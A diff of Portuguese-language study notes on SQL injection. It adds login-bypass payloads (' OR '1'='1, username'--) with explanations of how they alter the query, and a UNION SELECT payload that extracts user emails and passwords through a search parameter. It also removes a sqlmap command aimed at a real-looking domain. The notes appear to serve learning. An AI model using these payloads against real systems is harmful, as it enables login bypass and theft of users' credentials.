@@ -37,6 +37,8 @@ ________________________________________________________________________________
 TIPOS DE SQLi
 OBS: Normalmente SQLi funciona com links que em sua URL indicam parametros de uma query SQL. ex:
     -> http://testphp.vulnweb.com/listproducts.php?cat=2
+     ou em sites que não tratam apropriadamente o login. ex:
+    -> https://demo.testfire.net/login.jsp
 
 ==> IN-BAND (CLÁSSICO)
     -> é o método mais facil
@@ -160,9 +162,17 @@ OBS:
 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 
-SQLi AVANÇADO
+RESUMO
 
--> É possível, também, fazer SQLinjection manipulando os campos do header da requisição
--> Esses campos, inclusive, muitos ficam ocultos da própria requisição
+===> Login (SELECT * FROM users WHERE username ='admin' AND password='password123')
+        -> nome-de-usuario' OR '1'='1
+            -> SELECT * FROM users WHERE username= 'admin' OR '1'='1' AND password='password123'
+            -> como no sql language o AND vem antes do OR, entao vai ser checado a combinaçao de usernameVSpassword e dps vai rodar o OR
 
-sqlmap -u dev.amigo.dev.br/home --dbmas= ') OR 1=1 --]
+        -> nome-de-usuario'--
+            -> SELECT * FROM users where username='nome-de-usuario'-- 'AND password='password123'
+            -> tudo após o "--" se torna um comentário então só o usuario é checado
+
+===> Search Query (GET /path/search?q= HTTP/1.1)
+        -> '))UNION/**/SELECT/**/id,/**/email,/**/password,/**/'4',/**/'5',/**/'6',/**/'8',/**/'9'/**/FROM/**/users--
+            -> colocar no query de busca da requisição (q=*payload*)
